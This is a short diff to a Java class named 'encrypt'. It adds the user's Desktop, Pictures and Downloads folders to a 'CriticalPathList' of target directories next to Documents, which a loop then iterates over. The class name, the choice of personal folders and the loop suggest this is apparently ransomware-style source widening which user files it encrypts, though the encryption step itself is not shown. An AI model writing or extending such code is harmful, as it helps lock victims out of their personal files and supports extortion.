@@ -41,10 +41,12 @@ public class encrypt {
         }
 
         ArrayList<String> CriticalPathList = new ArrayList<String>();
-        // Add sensitive directories to the list
 
+
+        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
         CriticalPathList.add(System.getProperty("user.home") + "/Documents");
-
+        CriticalPathList.add(System.getProperty("user.home") + "/Pictures");
+        CriticalPathList.add(System.getProperty("user.home") + "/Downloads");
 
         for (String TargetDirectory : CriticalPathList) {
 
